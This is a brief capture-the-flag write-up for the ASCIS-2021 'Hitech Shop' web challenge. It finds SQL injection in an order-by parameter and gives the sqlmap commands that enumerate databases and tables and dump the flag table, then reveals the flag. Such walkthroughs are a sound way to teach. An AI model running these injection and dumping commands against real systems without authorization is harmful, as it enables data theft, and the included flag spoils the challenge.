# ASCIS-2021 Warm-up - 100pts
* Category: Web 
* Name: Hitech Shop
* Level: None
* Description: None

## Solution
* Overview the challenge provided us a search box i think it `sql injection`
![Main function](./challenge.PNG) 
*  i try `double quote` and this web response 
![Main function](./sqli.PNG)
* After that i save `request` from `BurpSuite` and scan it with sqlmap
![Main function](./request.PNG)
* Run this command in sqlmap `sqlmap -u http://125.235.240.166:20105/index?order=price --time-sec=200 --user-agent=* --dbs --level 5 `i found two databases, but i only attention `vannd` 
![Main function](./sqlmap0.PNG)
* Then i use command `sqlmap -u http://125.235.240.166:20105/index?order=price --tables -D vannd` for scan `vand` table 
* Finally i found a table contain flag =))))
![Main function](./sqlmap1.PNG)
* Later i scan `flag` table use this command `sqlmap -u http://125.235.240.166:20105/index?order=price --columns -D vannd -T flag --dump`
![Main function](./sqlmap2.PNG)
* FLAG `ASCIS{SQL_1nJecTi0n_Ba5e_0N_OrdeR_bY}`
